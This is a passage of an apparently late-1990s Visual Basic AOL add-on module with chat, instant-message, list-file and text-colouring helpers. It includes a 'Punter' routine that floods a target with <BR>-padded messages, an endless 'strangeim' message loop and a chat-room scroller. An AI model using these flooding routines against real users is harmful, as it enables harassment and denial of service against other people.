Call SendMessage(KeyWordWin%, WM_CLOSE, 0, 0)
End Sub
Function LastChatLine()
ChatText = LastChatLineWithSN
ChatTrimNum = Len(SNFromLastChatLine)
ChatTrim$ = Mid$(ChatText, ChatTrimNum + 4, Len(ChatText) - Len(SNFromLastChatLine))
LastChatLine = ChatTrim$
End Function

Public Function ListToMailString(TheList As ListBox) As String
    Dim DoList As Long, MailString As String
    If TheList.List(0) = "" Then Exit Function
    For DoList& = 0 To TheList.ListCount - 1
        MailString$ = MailString$ & "(" & TheList.List(DoList&) & "), "
    Next DoList&
    MailString$ = Mid(MailString$, 1, Len(MailString$) - 2)
    ListToMailString$ = MailString$
End Function


Public Sub Load2listboxes(Directory As String, ListA As ListBox, ListB As ListBox)
    Dim MyString As String, aString As String, bString As String
    On Error Resume Next
    Open Directory$ For Input As #1
    While Not EOF(1)
        Input #1, MyString$
        aString$ = Left(MyString$, InStr(MyString$, "*") - 1)
        bString$ = Right(MyString$, Len(MyString$) - InStr(MyString$, "*"))
        DoEvents
        ListA.AddItem aString$
        ListB.AddItem bString$
    Wend
    Close #1
End Sub


Public Sub LoadComboBox(ByVal Directory As String, Combo As ComboBox)
    Dim MyString As String
    On Error Resume Next
    Open Directory$ For Input As #1
    While Not EOF(1)
        Input #1, MyString$
        DoEvents
        Combo.AddItem MyString$
    Wend
    Close #1
End Sub


Public Sub Loadlistbox(Directory As String, TheList As ListBox)
    Dim MyString As String
    On Error Resume Next
    Open Directory$ For Input As #1
    While Not EOF(1)
        Input #1, MyString$
        DoEvents
        TheList.AddItem MyString$
    Wend
    Close #1
End Sub


Sub LoadText(txtLoad As TextBox, Path As String)
    Dim TextString As String
    On Error Resume Next
    Open Path$ For Input As #1
    TextString$ = Input(LOF(1), #1)
    Close #1
    txtLoad.Text = TextString$
End Sub


Public Sub PlayMIDI(MIDIFile As String)
    Dim SafeFile As String
    SafeFile$ = DiR(MIDIFile$)
    If SafeFile$ <> "" Then
        Call mciSendString("play " & MIDIFile$, 0&, 0, 0)
    End If
End Sub


Public Sub PrivateRoom(Room As String)
    Call Keyword("aol://2719:2-2-" & Room$)
End Sub
Public Function ProfileGet(ScreenName As String) As String
    Dim AOL As Long, tool As Long, Toolbar As Long
    Dim ToolIcon As Long, DoThis As Long, sMod As Long
    Dim MDI As Long, pgWindow As Long, pgEdit As Long, pgButton As Long
    Dim pWindow As Long, pTextWindow As Long, pString As String
    Dim NoWindow As Long, OKButton As Long, CurPos As POINTAPI
    Dim WinVis As Long
    AOL& = FindWindow("AOL Frame25", vbNullString)
    MDI& = FindWindowEx(AOL&, 0&, "MDIClient", vbNullString)
    tool& = FindWindowEx(AOL&, 0&, "AOL Toolbar", vbNullString)
    Toolbar& = FindWindowEx(tool&, 0&, "_AOL_Toolbar", vbNullString)
    ToolIcon& = FindWindowEx(Toolbar&, 0&, "_AOL_Icon", vbNullString)
    ToolIcon& = FindWindowEx(Toolbar&, ToolIcon&, "_AOL_Icon", vbNullString)
    ToolIcon& = FindWindowEx(Toolbar&, ToolIcon&, "_AOL_Icon", vbNullString)
    ToolIcon& = FindWindowEx(Toolbar&, ToolIcon&, "_AOL_Icon", vbNullString)
    ToolIcon& = FindWindowEx(Toolbar&, ToolIcon&, "_AOL_Icon", vbNullString)
    ToolIcon& = FindWindowEx(Toolbar&, ToolIcon&, "_AOL_Icon", vbNullString)
    ToolIcon& = FindWindowEx(Toolbar&, ToolIcon&, "_AOL_Icon", vbNullString)
    ToolIcon& = FindWindowEx(Toolbar&, ToolIcon&, "_AOL_Icon", vbNullString)
    ToolIcon& = FindWindowEx(Toolbar&, ToolIcon&, "_AOL_Icon", vbNullString)
    ToolIcon& = FindWindowEx(Toolbar&, ToolIcon&, "_AOL_Icon", vbNullString)
    Call GetCursorPos(CurPos)
    Call SetCursorPos(Screen.Width, Screen.Height)
    Call PostMessage(ToolIcon&, WM_LBUTTONDOWN, 0&, 0&)
    Call PostMessage(ToolIcon&, WM_LBUTTONUP, 0&, 0&)
    Do
        sMod& = FindWindow("#32768", vbNullString)
        WinVis& = IsWindowVisible(sMod&)
    Loop Until WinVis& = 1
    Call PostMessage(sMod&, WM_KEYDOWN, VK_UP, 0&)
    Call PostMessage(sMod&, WM_KEYUP, VK_UP, 0&)
    Call PostMessage(sMod&, WM_KEYDOWN, VK_UP, 0&)
    Call PostMessage(sMod&, WM_KEYUP, VK_UP, 0&)
    Call PostMessage(sMod&, WM_KEYDOWN, VK_RETURN, 0&)
    Call PostMessage(sMod&, WM_KEYUP, VK_RETURN, 0&)
    Call SetCursorPos(CurPos.X, CurPos.Y)
    Do
        DoEvents
        pgWindow& = FindWindowEx(MDI&, 0&, "AOL Child", "Get a Member's Profile")
        pgEdit& = FindWindowEx(pgWindow&, 0&, "_AOL_Edit", vbNullString)
        pgButton& = FindWindowEx(pgWindow&, 0&, "_AOL_Icon", vbNullString)
    Loop Until pgWindow& <> 0& And pgEdit& <> 0& And pgButton& <> 0&
    Call SendMEssageByString(pgEdit&, WM_SETTEXT, 0&, ScreenName$)
    Call SendMessage(pgButton&, WM_LBUTTONDOWN, 0&, 0&)
    Call SendMessage(pgButton&, WM_LBUTTONUP, 0&, 0&)
    DoEvents
    Do
        DoEvents
        pWindow& = FindWindowEx(MDI&, 0&, "AOL Child", "Member Profile")
        pTextWindow& = FindWindowEx(pWindow&, 0&, "_AOL_View", vbNullString)
        pString$ = GetText(pTextWindow&)
        NoWindow& = FindWindow("#32770", "America Online")
    Loop Until pWindow& <> 0& And pTextWindow& <> 0& Or NoWindow& <> 0&
    DoEvents
    If NoWindow& <> 0& Then
        OKButton& = FindWindowEx(NoWindow&, 0&, "Button", "OK")
        Call SendMessage(OKButton&, WM_KEYDOWN, VK_SPACE, 0&)
        Call SendMessage(OKButton&, WM_KEYUP, VK_SPACE, 0&)
        Call PostMessage(pgWindow&, WM_CLOSE, 0&, 0&)
        ProfileGet$ = "< No Profile >"
    Else
        Call PostMessage(pWindow&, WM_CLOSE, 0&, 0&)
        Call PostMessage(pgWindow&, WM_CLOSE, 0&, 0&)
        ProfileGet$ = pString$
    End If
End Function
Public Sub PublicRoom(Room As String)
    Call Keyword("aol://2719:21-2-" & Room$)
End Sub


Public Function RoomCount() As Long
    Dim AOL As Long, MDI As Long, rMail As Long, rList As Long
    Dim Count As Long
    AOL& = FindWindow("AOL Frame25", vbNullString)
    MDI& = FindWindowEx(AOL&, 0&, "MDICLIENT", vbNullString)
    rMail& = FindRoom
    rList& = FindWindowEx(rMail&, 0&, "_AOL_Listbox", vbNullString)
    Count& = SendMessage(rList&, LB_GETCOUNT, 0&, 0&)
    RoomCount& = Count&
End Function

Public Sub Save2ListBoxes(Directory As String, ListA As ListBox, ListB As ListBox)
    Dim SaveLists As Long
    On Error Resume Next
    Open Directory$ For Output As #1
    For SaveLists& = 0 To ListA.ListCount - 1
        Print #1, ListA.List(SaveLists&) & "*" & ListB.List(SaveLists)
    Next SaveLists&
    Close #1
End Sub

Public Sub SaveComboBox(ByVal Directory As String, Combo As ComboBox)
    Dim SaveCombo As Long
    On Error Resume Next
    Open Directory$ For Output As #1
    For SaveCombo& = 0 To Combo.ListCount - 1
        Print #1, Combo.List(SaveCombo&)
    Next SaveCombo&
    Close #1
End Sub


Public Sub SaveListBox(Directory As String, TheList As ListBox)
    Dim SaveList As Long
    On Error Resume Next
    Open Directory$ For Output As #1
    For SaveList& = 0 To TheList.ListCount - 1
        Print #1, TheList.List(SaveList&)
    Next SaveList&
    Close #1
End Sub


Sub SaveText(txtSave As TextBox, Path As String)
    Dim TextString As String
    On Error Resume Next
    TextString$ = txtSave.Text
    Open Path$ For Output As #1
    Print #1, TextString$
    Close #1
End Sub

Public Sub Scroll(ScrollString As String)
    Dim CurLine As String, Count As Long, ScrollIt As Long
    Dim sProgress As Long
    If FindRoom& = 0 Then Exit Sub
    If ScrollString$ = "" Then Exit Sub
    Count& = LineCount(ScrollString$)
    sProgress& = 1
    For ScrollIt& = 1 To Count&
        CurLine$ = LineFromString(ScrollString$, ScrollIt&)
        If Len(CurLine$) > 3 Then
            If Len(CurLine$) > 92 Then
                CurLine$ = Left(CurLine$, 92)
            End If
            Call ChatSend(CurLine$)
            Pause 0.7
        End If
        sProgress& = sProgress& + 1
        If sProgress& > 4 Then
            sProgress& = 1
            Pause 0.5
        End If
    Next ScrollIt&
End Sub
Public Sub Pause(duration As Long)
    Dim Current As Long
    Current = Timer
    Do Until Timer - Current >= duration
        DoEvents
    Loop
End Sub
Public Sub ChatSend(Chat As String)
    Dim Room As Long, AORich As Long, AORich2 As Long
    Room& = FindRoom&
    AORich& = FindWindowEx(Room, 0&, "RICHCNTL", vbNullString)
    AORich2& = FindWindowEx(Room, AORich, "RICHCNTL", vbNullString)
    Call SendMEssageByString(AORich2, WM_SETTEXT, 0&, Chat$)
    Call SendMessageLong(AORich2, WM_CHAR, ENTER_KEY, 0&)
End Sub


Public Function LineFromString(MyString As String, Line As Long) As String
    Dim theline As String, Count As Long
    Dim FSpot As Long, LSpot As Long, DoIt As Long
    Count& = LineCount(MyString$)
    If Line& > Count& Then
        Exit Function
    End If
    If Line& = 1 And Count& = 1 Then
        LineFromString$ = MyString$
        Exit Function
    End If
    If Line& = 1 Then
        theline$ = Left(MyString$, InStr(MyString$, Chr(13)) - 1)
        theline$ = ReplaceString(theline$, Chr(13), "")
        theline$ = ReplaceString(theline$, Chr(10), "")
        LineFromString$ = theline$
        Exit Function
    Else
        FSpot& = InStr(MyString$, Chr(13))
        For DoIt& = 1 To Line& - 1
            LSpot& = FSpot&
            FSpot& = InStr(FSpot& + 1, MyString$, Chr(13))
        Next DoIt
        If FSpot = 0 Then
            FSpot = Len(MyString$)
        End If
        theline$ = Mid(MyString$, LSpot&, FSpot& - LSpot& + 1)
        theline$ = ReplaceString(theline$, Chr(13), "")
        theline$ = ReplaceString(theline$, Chr(10), "")
        LineFromString$ = theline$
    End If
End Function
Public Function ReplaceString(MyString As String, ToFind As String, ReplaceWith As String) As String
    Dim Spot As Long, NewSpot As Long, LeftString As String
    Dim RightString As String, NewString As String
    Spot& = InStr(LCase(MyString$), LCase(ToFind))
    NewSpot& = Spot&
    Do
        If NewSpot& > 0& Then
            LeftString$ = Left(MyString$, NewSpot& - 1)
            If Spot& + Len(ToFind$) <= Len(MyString$) Then
                RightString$ = Right(MyString$, Len(MyString$) - NewSpot& - Len(ToFind$) + 1)
            Else
                RightString = ""
            End If
            NewString$ = LeftString$ & ReplaceWith$ & RightString$
            MyString$ = NewString$
        Else
            NewString$ = MyString$
        End If
        Spot& = NewSpot& + Len(ReplaceWith$)
        If Spot& > 0 Then
            NewSpot& = InStr(Spot&, LCase(MyString$), LCase(ToFind$))
        End If
    Loop Until NewSpot& < 1
    ReplaceString$ = NewString$
End Function



Public Function LineCount(MyString As String) As Long
    Dim Spot As Long, Count As Long
    If Len(MyString$) < 1 Then
        LineCount& = 0&
        Exit Function
    End If
    Spot& = InStr(MyString$, Chr(13))
    If Spot& <> 0& Then
        LineCount& = 1
        Do
            Spot& = InStr(Spot + 1, MyString$, Chr(13))
            If Spot& <> 0& Then
                LineCount& = LineCount& + 1
            End If
        Loop Until Spot& = 0&
    End If
    LineCount& = LineCount& + 1
End Function
Public Sub StopMIDI(MIDIFile As String)
    Dim SafeFile As String
    SafeFile$ = DiR(MIDIFile$)
    If SafeFile$ <> "" Then
        Call mciSendString("stop " & MIDIFile$, 0&, 0, 0)
    End If
End Sub



Function LastChatLineWithSN()
ChatText$ = GetChatText

For FindChar = 1 To Len(ChatText$)

thechar$ = Mid(ChatText$, FindChar, 1)
thechars$ = thechars$ & thechar$

If thechar$ = Chr(13) Then
TheChatText$ = Mid(thechars$, 1, Len(thechars$) - 1)
thechars$ = ""
End If

Next FindChar

lastlen = Val(FindChar) - Len(thechars$)
LastLine = Mid(ChatText$, lastlen, Len(thechars$))

LastChatLineWithSN = LastLine
End Function

Public Function Playwav(FileName)
Flagss% = SND_ASNC Or SND_SYNC
Play2 = sndPlaySound(FileName, Flagss%)
End Function

Function Punter(Text)
'this is a fun  punt string
' it is best to put it in a
'timer... Make sure u have a
'stop button or it will just keep goin
Dim Punt
Punt = "<BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR>"
Dim pu
pu = "<BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR>"
Call IMKeyword(Text2.Text, pu)
Call IMKeyword(Text2.Text, Punt)
End Function

     Sub PlaySound(Xsound As String)
         Dim X%
         X% = sndPlaySound(Xsound, SND_ASYNC)
     End Sub

Sub RespondIM(Message)
'This finds an IM sent to you, answers it with a
'message of "message", sends it and then closes the
'IM window
AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(AOL%, "MDIClient")

Im% = FindChildByTitle(MDI%, ">Instant Message From:")
If Im% Then GoTo Greed
Im% = FindChildByTitle(MDI%, "  Instant Message From:")
If Im% Then GoTo Greed
Exit Sub
Greed:
E = FindChildByClass(Im%, "RICHCNTL")

E = GetWindow(E, GW_HWNDNEXT)
E = GetWindow(E, GW_HWNDNEXT)
E = GetWindow(E, GW_HWNDNEXT)
'e = GetWindow(e, GW_HWNDNEXT)
'e = GetWindow(e, GW_HWNDNEXT)
'e = GetWindow(e, GW_HWNDNEXT)

E = GetWindow(E, GW_HWNDNEXT)
E = GetWindow(E, GW_HWNDNEXT)
E = GetWindow(E, GW_HWNDNEXT)
E = GetWindow(E, GW_HWNDNEXT)
E = GetWindow(E, GW_HWNDNEXT)
E = GetWindow(E, GW_HWNDNEXT)
E = GetWindow(E, GW_HWNDNEXT)
E = GetWindow(E, GW_HWNDNEXT)
E = GetWindow(E, GW_HWNDNEXT)
e2 = GetWindow(E, GW_HWNDNEXT) 'Send Text
E = GetWindow(e2, GW_HWNDNEXT) 'Send Button
Call SendMEssageByString(e2, WM_SETTEXT, 0, Message)
ClickIcon (E)
Call Timeout(0.8)
Im% = FindChildByTitle(MDI%, "  Instant Message From:")
E = FindChildByClass(Im%, "RICHCNTL")
E = GetWindow(E, GW_HWNDNEXT)
E = GetWindow(E, GW_HWNDNEXT)
E = GetWindow(E, GW_HWNDNEXT)
E = GetWindow(E, GW_HWNDNEXT)
E = GetWindow(E, GW_HWNDNEXT)
E = GetWindow(E, GW_HWNDNEXT)
E = GetWindow(E, GW_HWNDNEXT)
E = GetWindow(E, GW_HWNDNEXT)
E = GetWindow(E, GW_HWNDNEXT)
E = GetWindow(E, GW_HWNDNEXT)
E = GetWindow(E, GW_HWNDNEXT)
E = GetWindow(E, GW_HWNDNEXT)
E = GetWindow(E, GW_HWNDNEXT) 'cancel button...
'to close the IM window
ClickIcon (E)
End Sub
Function RGB2HEX(r, G, B)
    Dim X&
    Dim xx&
    Dim Color&
    Dim Divide
    Dim Answer&
    Dim Remainder&
    Dim Configuring$
    For X& = 1 To 3
        If X& = 1 Then Color& = B
        If X& = 2 Then Color& = G
        If X& = 3 Then Color& = r
        For xx& = 1 To 2
            Divide = Color& / 16
            Answer& = Int(Divide)
            Remainder& = (10000 * (Divide - Answer&)) / 625
            If Remainder& < 10 Then Configuring$ = Str(Remainder&) + Configuring$
            If Remainder& = 10 Then Configuring$ = "A" + Configuring$
            If Remainder& = 11 Then Configuring$ = "B" + Configuring$
            If Remainder& = 12 Then Configuring$ = "C" + Configuring$
            If Remainder& = 13 Then Configuring$ = "D" + Configuring$
            If Remainder& = 14 Then Configuring$ = "E" + Configuring$
            If Remainder& = 15 Then Configuring$ = "F" + Configuring$
            Color& = Answer&
        Next xx&
    Next X&
    Configuring$ = TrimSpaces(Configuring$)
    RGB2HEX = Configuring$
End Function


Sub RunMenu(menu1 As Integer, menu2 As Integer)
Dim AOLWorks As Long
Static Working As Integer

AOLMenus% = GetMenu(FindWindow("AOL Frame25", vbNullString))
AOLSubMenu% = GetSubMenu(AOLMenus%, menu1)
AOLItemID = GetMenuItemID(AOLSubMenu%, menu2)
AOLWorks = CLng(0) * &H10000 Or Working
ClickAOLMenu = sendmessagebynum(FindWindow("AOL Frame25", vbNullString), 273, AOLItemID, 0&)

End Sub


Sub RunMenuByString(Application, StringSearch)
ToSearch% = GetMenu(Application)
MenuCount% = GetMenuItemCount(ToSearch%)

For FindString = 0 To MenuCount% - 1
ToSearchSub% = GetSubMenu(ToSearch%, FindString)
MenuItemCount% = GetMenuItemCount(ToSearchSub%)

For getstring = 0 To MenuItemCount% - 1
SubCount% = GetMenuItemID(ToSearchSub%, getstring)
MenuString$ = String$(100, " ")
GetStringMenu% = GetMenuString(ToSearchSub%, SubCount%, MenuString$, 100, 1)

If InStr(UCase(MenuString$), UCase(StringSearch)) Then
MenuItem% = SubCount%
GoTo MatchString
End If

Next getstring

Next FindString
MatchString:
RunTheMenu% = SendMessage(Application, WM_COMMAND, MenuItem%, 0)
End Sub
Function Saying()
'This will generate a random saying
'werks good for an 8 ball bot
Dim l003A As Variant
Randomize Timer
l003A = Int(Rnd * 8)
Select Case l003A
Case 1: SendChat "<B>-=8=--Hmm.....ask again Later"
Case 2: SendChat "<B>-=8=--Yeah baby!"
Case 3: SendChat "<B>-=8=--YES!"
Case 4: SendChat "<B>-=8=--NO!"
Case 5: SendChat "<B>-=8=--It looks to be in your favor!"
Case 6: SendChat "<B>-=8=--If you only knew! };-)"
Case 7: SendChat "<B>-=8=--GUESS WHAT! I don't care"
Case Else: SendChat "<B>-=8=--Sorry! Not this time."
End Select
End Function

Function Saying2()
'This will generate a random saying
'werks good for a drug bot
Dim l003A As Variant
Randomize Timer
l003A = Int(Rnd * 8)
Select Case l003A
Case 1: SendChat "<B>-=8=--U get a big fat <(((((Joint))))))>"
Case 2: SendChat "<B>-=8=--U get  Acid"
Case 3: SendChat "<B>-=8=--U get a  -----(  Needle  )--|"
Case 4: SendChat "<B>-=8=-- U get shrooms"
Case 5: SendChat "<B>-=8=-- Hehe U overdosed"
Case 6: SendChat "<B>-=8=--U get pills () to pop"
Case 7: SendChat "<B>-=8=--Fugg u u are a nark and get nuttin"
Case Else: SendChat "<B>-=8=-- U get a big fat Crack roc"
End Select
End Function

Function ScrambleText(TheText)
'sees if there's a space in the text to be scrambled,
'if found space, continues, if not, adds it
findlastspace = Mid(TheText, Len(TheText), 1)

If Not findlastspace = " " Then
TheText = TheText & " "
Else
TheText = TheText
End If

'Scrambles the text
For scrambling = 1 To Len(TheText)
DoEvents
thechar$ = Mid(TheText, scrambling, 1)
char$ = char$ & thechar$

If thechar$ = " " Then
'takes out " " space from the text left of the space
chars$ = Mid(char$, 1, Len(char$) - 1)
'gets first character
firstchar$ = Mid(chars$, 1, 1)
'gets last character (if not, makes first character only)
On Error GoTo cityz
lastchar$ = Mid(chars$, Len(chars$), 1)

'finds what is inbetween the last and first character
midchar$ = Mid(chars$, 2, Len(chars$) - 2)
'reverses the text found in between the last and first
'character
For SpeedBack = Len(midchar$) To 1 Step -1
DoEvents
backchar$ = backchar$ & Mid$(midchar$, SpeedBack, 1)
Next SpeedBack
GoTo sniffe

'adds the scrambled text to the full scrambled element
cityz:
Scrambled$ = Scrambled$ & firstchar$ & " "
GoTo sniffs

sniffe:
Scrambled$ = Scrambled$ & lastchar$ & firstchar$ & backchar$ & " "

'clears character and reversed buffers
sniffs:
char$ = ""
backchar$ = ""
End If

Next scrambling
'Makes function return value the scrambled text
ScrambleText = Scrambled$

Exit Function
End Function

Sub SendChat(Chat)
Room% = FindChatRoom
AORich% = FindChildByClass(Room%, "RICHCNTL")

AORich% = GetWindow(AORich%, 2)
AORich% = GetWindow(AORich%, 2)
AORich% = GetWindow(AORich%, 2)
AORich% = GetWindow(AORich%, 2)
AORich% = GetWindow(AORich%, 2)
AORich% = GetWindow(AORich%, 2)

Call SetFocusAPI(AORich%)
Call SendMEssageByString(AORich%, WM_SETTEXT, 0, Chat)
DoEvents
Call sendmessagebynum(AORich%, WM_CHAR, 13, 0)
End Sub


Function SearchForSelected(Lst As ListBox)
If Lst.List(0) = "" Then
counterf = 0
GoTo last
End If
counterf = -1

start:
counterf = counterf + 1
If Lst.ListCount = counterf + 1 Then GoTo last
If Lst.Selected(counterf) = True Then GoTo last
If couterf = Lst.ListCount Then GoTo last
GoTo start

last:
SearchForSelected = counterf
End Function

Sub Showaol()
AOL% = FindWindow("AOL Frame25", vbNullString)
Call showwindow(AOL%, 5)
End Sub

Function SNfromIM()

AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(AOL%, "MDIClient") '

Im% = FindChildByTitle(MDI%, ">Instant Message From:")
If Im% Then GoTo Greed
Im% = FindChildByTitle(MDI%, "  Instant Message From:")
If Im% Then GoTo Greed
Exit Function
Greed:
IMCap$ = GetCaption(Im%)
TheSN$ = Mid(IMCap$, InStr(IMCap$, ":") + 2)
SNfromIM = TheSN$

End Function


Function SNFromLastChatLine()
ChatText$ = LastChatLineWithSN
ChatTrim$ = Left$(ChatText$, 11)
For Z = 1 To 11
    If Mid$(ChatTrim$, Z, 1) = ":" Then
        SN = Left$(ChatTrim$, Z - 1)
    End If
Next Z
SNFromLastChatLine = SN
End Function


Sub strangeim(stuff)
'I can't rember where I got this
'sub from but this is not one of mine
'thanxz to who ever I got it from
Do:
DoEvents
Call IMKeyword(stuff, "<body bgcolor=#000000>")
Call IMKeyword(stuff, "<body bgcolor=#0000FF>")
Call IMKeyword(stuff, "<body bgcolor=#FF0000>")
Call IMKeyword(stuff, "<body bgcolor=#00FF00>")
Call IMKeyword(stuff, "<body bgcolor=#C0C0C0>")
Loop 'This will loop untill a stop button is pressed.
End Sub

Sub StrikeOutSendChat(StrikeOutChat)
'This is a new sub that I thought of. It strikes
'the chat text out.
SendChat ("<S>" & StrikeOutChat & "</S>")
End Sub


Function ThreeColors(Text As String, Red1, Green1, Blue1, Red2, Green2, Blue2, Red3, Green3, Blue3, Wavy As Boolean)

'This code is still buggy, use at your own risk

    D = Len(Text)
        If D = 0 Then GoTo TheEnd
        If D = 1 Then Fade1 = Text
    For X = 2 To 500 Step 2
        If D = X Then GoTo Evens
    Next X
    For X = 3 To 501 Step 2
        If D = X Then GoTo Odds
    Next X
Evens:
    C = D \ 2
    Fade1 = Left(Text, C)
    Fade2 = Right(Text, C)
    GoTo TheEnd
Odds:
    C = D \ 2
    Fade1 = Left(Text, C)
    Fade2 = Right(Text, C + 1)
TheEnd:
    LA1 = Fade1
    LA2 = Fade2
        If Wavy = True Then FadeA = TwoColors(Left(LA1, Len(LA1) - 1), Red1, Green1, Blue1, Red2, Green2, Blue2, True) + TwoColors(Right(LA1, 1), Red2, Green2, Blue2, Red2, Green2, Blue2, True)
        If Wavy = False Then FadeA = TwoColors(Left(LA1, Len(LA1) - 1), Red1, Green1, Blue1, Red2, Green2, Blue2, False) + TwoColors(Right(LA1, 1), Red2, Green2, Blue2, Red2, Green2, Blue2, False)
        If Wavy = True Then FadeB = TwoColors(Left(LA2, Len(LA2) - 1), Red2, Green2, Blue2, Red3, Green3, Blue3, True) + TwoColors(Right(LA2, 1), Red3, Green3, Blue3, Red3, Green3, Blue3, True)
        If Wavy = False Then FadeB = TwoColors(Left(LA2, Len(LA2) - 1), Red2, Green2, Blue2, Red3, Green3, Blue3, False) + TwoColors(Right(LA2, 1), Red3, Green3, Blue3, Red3, Green3, Blue3, False)
    Msg = FadeA + FadeB
  BoldSendChat (Msg)
End Function

'Variable color fade functions begin here


Function TwoColors(Text, Red1, Green1, Blue1, Red2, Green2, Blue2, Wavy As Boolean)
    C1BAK = c1
    C2BAK = c2
    C3BAK = c3
    C4BAK = c4
    C = 0
    O = 0
    o2 = 0
    q = 1
    Q2 = 1
    For X = 1 To Len(Text)
        BVAL1 = Red2 - Red1
        BVAL2 = Green2 - Green1
        BVAL3 = Blue2 - Blue1
        
        VAL1 = (BVAL1 / Len(Text) * X) + Red1
        VAL2 = (BVAL2 / Len(Text) * X) + Green1
        VAL3 = (BVAL3 / Len(Text) * X) + Blue1
        
        c1 = RGB2HEX(VAL1, VAL2, VAL3)
        c2 = RGB2HEX(VAL1, VAL2, VAL3)
        c3 = RGB2HEX(VAL1, VAL2, VAL3)
        c4 = RGB2HEX(VAL1, VAL2, VAL3)
        
        If c1 = c2 And c2 = c3 And c3 = c4 And c4 = c1 Then C = 1: Msg = Msg & "<FONT COLOR=#" + c1 + ">"
        If o2 = 1 Then o2 = 2 Else If o2 = 2 Then o2 = 3 Else If o2 = 3 Then o2 = 4 Else o2 = 1
        
        If C <> 1 Then
            If o2 = 1 Then Msg = Msg + "<FONT COLOR=#" + c1 + ">"
            If o2 = 2 Then Msg = Msg + "<FONT COLOR=#" + c2 + ">"
            If o2 = 3 Then Msg = Msg + "<FONT COLOR=#" + c3 + ">"
            If o2 = 4 Then Msg = Msg + "<FONT COLOR=#" + c4 + ">"
        End If
        
        If Wavy = True Then
            If o2 = 1 Then Msg = Msg + "<SUB>"
            If o2 = 3 Then Msg = Msg + "<SUP>"
            Msg = Msg + Mid$(Text, X, 1)
            If o2 = 1 Then Msg = Msg + "</SUB>"
            If o2 = 3 Then Msg = Msg + "</SUP>"
            If Q2 = 2 Then
                q = 1
                Q2 = 1
                If o2 = 1 Then Msg = Msg + "<FONT COLOR=#" + c1 + ">"
                If o2 = 2 Then Msg = Msg + "<FONT COLOR=#" + c2 + ">"
                If o2 = 3 Then Msg = Msg + "<FONT COLOR=#" + c3 + ">"
                If o2 = 4 Then Msg = Msg + "<FONT COLOR=#" + c4 + ">"
            End If
        ElseIf Wavy = False Then
            Msg = Msg + Mid$(Text, X, 1)
            If Q2 = 2 Then
            q = 1
            Q2 = 1
            If o2 = 1 Then Msg = Msg + "<FONT COLOR=#" + c1 + ">"
            If o2 = 2 Then Msg = Msg + "<FONT COLOR=#" + c2 + ">"
            If o2 = 3 Then Msg = Msg + "<FONT COLOR=#" + c3 + ">"
            If o2 = 4 Then Msg = Msg + "<FONT COLOR=#" + c4 + ">"
        End If
        End If
nc:     Next X
    c1 = C1BAK
    c2 = C2BAK
    c3 = C3BAK
    c4 = C4BAK
    BoldSendChat (Msg)
End Function


Sub Timeout(duration)
StartTime = Timer
Do While Timer - StartTime < duration
DoEvents
Loop

End Sub
Function TrimTime()
B$ = Left$(Time$, 5)
HourH$ = Left$(B$, 2)
HourA = Val(HourH$)
If HourA >= 12 Then Ap$ = "PM"
If HourA = 24 Or HourA < 12 Then Ap$ = "AM"
If HourA > 12 Then
    HourA = HourA - 12
End If
If HourA = 0 Then HourA = 12
HourH$ = Str$(HourA)
TrimTime = HourH$ & Right$(B$, 3) & " " & Ap$
End Function

Function TrimTime2()
B$ = Time$
HourH$ = Left$(B$, 2)
HourA = Val(HourH$)
If HourA >= 12 Then Ap$ = "PM"
If HourA = 24 Or HourA < 12 Then Ap$ = "AM"
If HourA > 12 Then
    HourA = HourA - 12
End If
If HourA = 0 Then HourA = 12
HourH$ = Str$(HourA)
TrimTime2 = HourH$ & ":" & Right$(B$, 5) & " " & Ap$
End Function


Sub UnUpchat()
AOL% = FindWindow("AOL Frame25", vbNullString)
AOModal% = FindChildByClass(AOL%, "_AOL_Modal")
AOGauge% = FindChildByClass(AOModal%, "_AOL_Gauge")
If AOGauge% <> 0 Then Upp% = AOModal%
Call EnableWindow(Upp%, 1)
Call EnableWindow(AOL%, 0)
End Sub



Function UserSN()
On Error Resume Next
AOL% = FindWindow("AOL Frame25", "America  Online")
MDI% = FindChildByClass(AOL%, "MDIClient")
welcome% = FindChildByTitle(MDI%, "Welcome, ")
WelcomeLength% = GetWindowTextLength(welcome%)
WelcomeTitle$ = String$(200, 0)
A% = GetWindowText(welcome%, WelcomeTitle$, (WelcomeLength% + 1))
User = Mid$(WelcomeTitle$, 10, (InStr(WelcomeTitle$, "!") - 10))
UserSN = User
End Function

Function wavetalker(strin2, f As ComboBox, c1 As ComboBox, c2 As ComboBox, c3 As ComboBox, c4 As ComboBox)
tixt = f
Color1 = c1
Color2 = c2
Color3 = c3
Color4 = c4
If Color1 = "Navy" Then Color1 = "000080"
If Color1 = "Maroon" Then Color1 = "800000"
If Color1 = "Lime" Then Color1 = "00FF00"
If Color1 = "Teal" Then Color1 = "008080"
If Color1 = "Red" Then Color1 = "F0000"
If Color1 = "Blue" Then Color1 = "0000FF"
If Color1 = "Siler" Then Color1 = "C0C0C0"
If Color1 = "Yellow" Then Color1 = "FFFF00"
If Color1 = "Aqua" Then Color1 = "00FFFF"
